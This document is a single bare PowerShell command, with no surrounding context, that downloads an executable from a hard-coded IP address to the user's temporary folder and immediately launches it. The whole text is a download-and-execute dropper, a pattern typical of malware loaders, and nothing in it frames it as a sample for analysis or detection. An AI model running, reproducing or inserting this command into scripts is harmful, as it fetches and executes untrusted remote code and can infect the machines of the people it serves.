
(New-Object System.Net.WebClient).DownloadFile('http://185.141.25.243/file.exe',"$env:TEMP\filex86.exe");Start-Process ("$env:TEMP\filex86.exe")

